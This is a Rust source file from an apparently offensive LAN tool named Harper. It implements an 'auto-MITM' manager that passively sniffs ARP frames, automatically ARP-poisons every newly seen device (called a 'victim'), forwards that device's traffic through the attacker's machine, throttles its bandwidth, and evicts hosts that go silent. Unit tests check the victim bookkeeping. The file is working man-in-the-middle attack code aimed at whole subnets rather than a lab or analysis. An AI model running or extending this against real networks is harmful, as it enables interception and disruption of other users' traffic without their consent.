// src/mitm_auto.rs
//
// Dynamic MITM manager for `--all` mode.
//
// When `--all` is given in MITM mode, Harper actively scans the subnet once to
// seed the victim set, then this manager keeps watching the wire for NEW devices
// and automatically pulls them into the MITM (ARP poison + packet forward +
// traffic shaping). Devices that go silent for longer than a timeout are evicted
// (poison stopped, forwarding disabled, shaping removed).
//
// Detection uses its OWN datalink channel — the forwarder already opens an
// independent channel (forwarder/engine.rs), and the scanner's receiver is
// dropped after discovery, so we cannot reuse either.

use crate::forwarder::{ForwarderCommand, RelayHandle};
use crate::host::table::{DiscoveredHost, HostId, HostState, HostTable};
use crate::scanner::engine::should_ignore_passive_frame;
use crate::spoofer::{SpoofTarget, SpooferCommand};
use crate::utils::tc::TcManager;
use pnet::datalink::{self, Channel, DataLinkReceiver};
use pnet::packet::Packet;
use pnet::packet::arp::ArpPacket;
use pnet::packet::ethernet::{EtherTypes, EthernetPacket};
use pnet::util::MacAddr;
use std::collections::HashMap;
use std::net::Ipv4Addr;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::{Duration, Instant};
use tokio::sync::{Mutex, RwLock, mpsc, oneshot};

/// How long a managed victim may stay silent before it is evicted from the MITM.
const STALE_TIMEOUT: Duration = Duration::from_secs(300);

/// Interval between staleness sweeps.
const SWEEP_INTERVAL: Duration = Duration::from_secs(30);

/// Internal event from the background passive sniffer.
enum WatchEvent {
    /// A new (or re-seen) device appeared on the wire.
    Seen(Ipv4Addr, MacAddr),
}

pub struct MitmAutoManager {
    interface_name: String,
    our_mac: MacAddr,
    our_ip: Ipv4Addr,
    gateway_ip: Ipv4Addr,
    gateway_mac: MacAddr,
    excluded_ip: Ipv4Addr,
    host_table: Arc<RwLock<HostTable>>,
    spoof_tx: mpsc::Sender<SpooferCommand>,
    relay: Arc<RelayHandle>,
    tc: TcManager,
    pool_upload_kbps: Option<u64>,
    pool_download_kbps: Option<u64>,
    upload_kbps: Option<u64>,
    download_kbps: Option<u64>,
    /// Hosts the manager is actively MITM-ing (for eviction bookkeeping).
    managed: HashMap<HostId, Instant>,
}

impl MitmAutoManager {
    #[allow(clippy::too_many_arguments)]
    pub fn new(
        interface_name: String,
        our_mac: MacAddr,
        our_ip: Ipv4Addr,
        gateway_ip: Ipv4Addr,
        gateway_mac: MacAddr,
        excluded_ip: Ipv4Addr,
        host_table: Arc<RwLock<HostTable>>,
        spoof_tx: mpsc::Sender<SpooferCommand>,
        relay: Arc<RelayHandle>,
        tc: TcManager,
        pool_upload_kbps: Option<u64>,
        pool_download_kbps: Option<u64>,
        upload_kbps: Option<u64>,
        download_kbps: Option<u64>,
    ) -> Self {
        Self {
            interface_name,
            our_mac,
            our_ip,
            gateway_ip,
            gateway_mac,
            excluded_ip,
            host_table,
            spoof_tx,
            relay,
            tc,
            pool_upload_kbps,
            pool_download_kbps,
            upload_kbps,
            download_kbps,
            managed: HashMap::new(),
        }
    }

    /// Seeds the manager with the initially-discovered victims (the active-scan
    /// batch). They are registered as "managed" so the staleness sweep tracks
    /// them too.
    pub async fn seed(&mut self, ids: &[HostId]) {
        let table = self.host_table.read().await;
        for &id in ids {
            if let Some(entry) = table.get_by_id(id) {
                self.managed.insert(id, Instant::now());
            }
        }
    }

    /// Number of hosts currently managed by the MITM (for tests/observability).
    pub(crate) fn managed_count(&self) -> usize {
        self.managed.len()
    }

    /// Runs the manager until `stop_rx` fires.
    pub async fn run(mut self, mut stop_rx: oneshot::Receiver<()>) {
        let (evt_tx, mut evt_rx) = mpsc::channel::<WatchEvent>(64);

        // Own datalink channel for passive ARP detection.
        let sniffer = match Self::open_receiver(&self.interface_name) {
            Some(rx) => rx,
            None => {
                eprintln!(
                    "[!] Auto-MITM: could not open sniff socket — dynamic discovery disabled."
                );
                // Still honour the stop signal so shutdown works.
                let _ = stop_rx.await;
                return;
            }
        };

        let sniff_stop = Arc::new(AtomicBool::new(false));
        let local_ip = self.our_ip;
        let local_mac = self.our_mac;
        Self::spawn_sniffer(sniffer, evt_tx, sniff_stop.clone(), local_ip, local_mac);

        let mut sweep = tokio::time::interval(SWEEP_INTERVAL);

        loop {
            tokio::select! {
                _ = &mut stop_rx => break,
                maybe_evt = evt_rx.recv() => {
                    match maybe_evt {
                        Some(WatchEvent::Seen(ip, mac)) => self.on_seen(ip, mac).await,
                        None => break, // sniffer died
                    }
                }
                _ = sweep.tick() => self.sweep().await,
            }
        }

        sniff_stop.store(true, Ordering::Relaxed);
        // Best-effort eviction of everything on shutdown.
        let ids: Vec<HostId> = self.managed.keys().copied().collect();
        for id in ids {
            self.evict(id).await;
        }
        // Tear down tc/nft so the network is restored.
        self.tc.cleanup().await;
        println!("[*] Auto-MITM manager stopped.");
    }

    /// Handles a device seen on the wire: inserts it into the host table and,
    /// if it is a new manageable victim, pulls it into the MITM.
    pub(crate) async fn on_seen(&mut self, ip: Ipv4Addr, mac: MacAddr) {
        if ip == self.excluded_ip {
            return; // never MITM the gateway/uplink
        }

        let id = {
            let mut table = self.host_table.write().await;
            table.insert(DiscoveredHost {
                ip,
                mac,
                hostname: None,
                vendor: None,
                last_seen: Instant::now(),
            })
        };

        if self.managed.contains_key(&id) {
            // Already managed — just refresh the last-seen timestamp.
            if let Some(slot) = self.managed.get_mut(&id) {
                *slot = Instant::now();
            }
            return;
        }

        self.add_victim(id, ip, mac).await;
        self.managed.insert(id, Instant::now());
        println!("[+] Auto-MITM: added victim [{}] {} ({})", id, ip, mac);
    }

    /// Wires a freshly-discovered victim into poison + forward + shape.
    async fn add_victim(&mut self, id: HostId, ip: Ipv4Addr, mac: MacAddr) {
        let target = SpoofTarget::new(id, ip, mac, self.gateway_ip, self.gateway_mac);
        let _ = self.spoof_tx.send(SpooferCommand::Start(target)).await;

        self.relay.enable(id, ip, mac, self.gateway_mac).await;

        if self.pool_upload_kbps.is_some() || self.pool_download_kbps.is_some() {
            // Pool mode: re-apply the shared class across ALL managed victims.
            self.apply_pool().await;
        } else if self.upload_kbps.is_some() || self.download_kbps.is_some() {
            if let Err(e) = self.tc.limit_host(id, ip, self.upload_kbps, self.download_kbps).await {
                eprintln!("[!] Auto-MITM: limit_host [{}] {}: {e}", id, ip);
            }
        }
    }

    /// Re-applies the shared pool class to the full set of managed victim IPs.
    async fn apply_pool(&mut self) {
        if self.pool_upload_kbps.is_none() && self.pool_download_kbps.is_none() {
            return;
        }
        let table = self.host_table.read().await;
        let victim_ips: Vec<Ipv4Addr> = self
            .managed
            .keys()
            .filter_map(|&id| table.get_by_id(id).map(|e| e.host.ip))
            .collect();
        drop(table);

        if let Err(e) = self.tc.limit_pool_split(self.pool_upload_kbps, self.pool_download_kbps, &victim_ips).await {
            eprintln!("[!] Auto-MITM: limit_pool_split failed: {e}");
        }
    }

    /// Periodically removes victims that have been silent too long.
    async fn sweep(&mut self) {
        let now = Instant::now();
        let stale: Vec<HostId> = self
            .managed
            .iter()
            .filter(|(_, last)| now.duration_since(**last) > STALE_TIMEOUT)
            .map(|(&id, _)| id)
            .collect();

        for id in stale {
            self.evict(id).await;
        }
    }

    /// Stops MITM for a victim and removes it from shaping + the host table.
    async fn evict(&mut self, id: HostId) {
        self.managed.remove(&id);

        let _ = self.spoof_tx.send(SpooferCommand::Stop(id)).await;
        self.relay.disable(id).await;

        if self.pool_upload_kbps.is_some() || self.pool_download_kbps.is_some() {
            self.apply_pool().await; // re-apply pool without the evicted IP
        } else {
            self.tc.remove_host(id).await.ok();
        }

        {
            let mut table = self.host_table.write().await;
            table.update_state(id, HostState::Discovered);
        }

        println!("[*] Auto-MITM: evicted stale victim [{}]", id);
    }

    // ── Passive sniffer ──────────────────────────────────────────────────────

    fn open_receiver(interface_name: &str) -> Option<Arc<Mutex<Box<dyn DataLinkReceiver>>>> {
        let iface = crate::utils::net::get_interface(interface_name)?;
        match datalink::channel(&iface, Default::default()) {
            Ok(Channel::Ethernet(_tx, rx)) => Some(Arc::new(Mutex::new(rx))),
            _ => None,
        }
    }

    fn spawn_sniffer(
        receiver: Arc<Mutex<Box<dyn DataLinkReceiver>>>,
        evt_tx: mpsc::Sender<WatchEvent>,
        stop: Arc<AtomicBool>,
        local_ip: Ipv4Addr,
        local_mac: MacAddr,
    ) {
        tokio::task::spawn_blocking(move || {
            let mut guard = receiver.blocking_lock();
            loop {
                if stop.load(Ordering::Relaxed) {
                    break;
                }
                match guard.next() {
                    Ok(data) => {
                        let Some(eth) = EthernetPacket::new(data) else {
                            continue;
                        };
                        if eth.get_ethertype() != EtherTypes::Arp {
                            continue;
                        }
                        let Some(arp) = ArpPacket::new(eth.payload()) else {
                            continue;
                        };
                        let sender_ip = arp.get_sender_proto_addr();
                        let sender_mac = arp.get_sender_hw_addr();

                        // Ignore our own frames, broadcasts, and zero MACs.
                        if should_ignore_passive_frame(sender_ip, sender_mac, local_ip, local_mac) {
                            continue;
                        }

                        let _ = evt_tx.try_send(WatchEvent::Seen(sender_ip, sender_mac));
                    }
                    Err(_) => break,
                }
            }
        });
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use pnet::util::MacAddr;
    use std::net::Ipv4Addr;
    use tokio::sync::mpsc;

    fn make_manager() -> (MitmAutoManager, Arc<RwLock<HostTable>>) {
        let table = Arc::new(RwLock::new(HostTable::new()));
        // Channels are created but their receivers are dropped immediately so the
        // manager's send() calls simply error out (ignored) — we only assert on
        // the pure state logic (host table + managed set), not real shaping.
        let (_s_tx, _s_rx) = mpsc::channel::<SpooferCommand>(1);
        let (_f_tx, _f_rx) = mpsc::channel::<ForwarderCommand>(1);
        let relay = Arc::new(RelayHandle::Userspace(_f_tx));
        let mgr = MitmAutoManager::new(
            "eth0".into(),
            MacAddr::new(0, 0, 0, 0, 0, 0),
            Ipv4Addr::new(192, 168, 1, 100),
            Ipv4Addr::new(192, 168, 1, 1),
            MacAddr::new(0, 0, 0, 0, 0, 1),
            Ipv4Addr::new(192, 168, 1, 1), // excluded = gateway
            Arc::clone(&table),
            _s_tx,
            relay,
            TcManager::new("eth0"),
            None, // pool upload off
            None, // pool download off
            None, // upload off
            None, // download off
        );
        (mgr, table)
    }

    #[tokio::test]
    async fn test_on_seen_adds_new_victim_to_managed_and_table() {
        let (mut mgr, table) = make_manager();

        // A brand-new device appears.
        mgr.on_seen(
            Ipv4Addr::new(192, 168, 1, 50),
            MacAddr::new(0xAA, 0, 0, 0, 0, 50),
        )
        .await;

        let t = table.read().await;
        assert!(t.get_by_ip(Ipv4Addr::new(192, 168, 1, 50)).is_some());
        assert_eq!(mgr.managed.len(), 1, "new victim should be managed");
    }

    #[tokio::test]
    async fn test_on_seen_ignores_excluded_gateway() {
        let (mut mgr, table) = make_manager();

        mgr.on_seen(
            Ipv4Addr::new(192, 168, 1, 1),
            MacAddr::new(0, 0, 0, 0, 0, 1),
        )
        .await;

        let t = table.read().await;
        assert!(t.get_by_ip(Ipv4Addr::new(192, 168, 1, 1)).is_none());
        assert!(mgr.managed.is_empty(), "gateway must never be managed");
    }

    #[tokio::test]
    async fn test_on_seen_dedupes_already_managed() {
        let (mut mgr, table) = make_manager();
        let ip = Ipv4Addr::new(192, 168, 1, 50);

        mgr.on_seen(ip, MacAddr::new(0xAA, 0, 0, 0, 0, 50)).await;
        mgr.on_seen(ip, MacAddr::new(0xAA, 0, 0, 0, 0, 50)).await;

        assert_eq!(mgr.managed.len(), 1, "re-seen host must not double-add");
        let _ = &table;
    }
}
